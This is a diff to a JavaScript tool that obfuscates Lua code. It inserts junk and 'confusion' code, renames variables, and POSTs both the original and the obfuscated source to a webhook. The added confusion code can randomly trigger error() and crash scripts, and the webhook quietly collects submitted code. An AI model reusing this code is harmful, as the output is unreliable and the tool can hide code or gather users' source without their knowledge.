@@ -7,10 +7,27 @@ function insertTrashCode(lines = 99) {
   let trash = '';
   for (let i = 0; i < lines; i++) {
     const rand = randomString();
-    trash += `-- junk\nlocal ${rand} = ${Math.random().toFixed(5)}\n`;
-    trash += `if false then print("${randomString()}") end\n`;
+    trash += `local ${rand} = ${Math.random().toFixed(5)}
+`;
+    trash += `if false then print("${randomString()}") end
+`;
   }
   return trash;
+}
+
+function insertConfusionCode(lines = 15) {
+  let conf = '';
+  for (let i = 0; i < lines; i++) {
+    const var1 = randomString();
+    const var2 = randomString();
+    conf += `local ${var1} = function() return ${Math.floor(Math.random() * 500)} end
+`;
+    conf += `local ${var2} = ${var1}()
+`;
+    conf += `if ${var2} == ${Math.floor(Math.random() * 1000)} then error("random") end
+`;
+  }
+  return conf;
 }
 
 function renameVariablesDeep(code) {
@@ -24,11 +41,11 @@ function renameVariablesDeep(code) {
 }
 
 function obfuscateLua(code) {
-  const head = '-- Obfuscated by Cat]\n-- Obfuscator V1.2\n\n';
-  const trashStart = insertTrashCode(20);
-  const trashEnd = insertTrashCode(10);
+  const head = '-- This File Was Protected By Cats Obfuscator V1\n\n';
+  const trash = insertTrashCode(99);
+  const confusion = insertConfusionCode(15);
   const renamed = renameVariablesDeep(code);
-  return head + trashStart + renamed + '\n' + trashEnd;
+  return head + trash + renamed + '\n' + confusion;
 }
 
 function downloadFile(filename, content) {
@@ -64,8 +81,6 @@ function sendToWebhook(webhookURL, original, obfuscated) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
-  }).then(r => {
-    if (!r.ok) console.error('Webhook failed:', r.statusText);
   }).catch(console.error);
 }
 
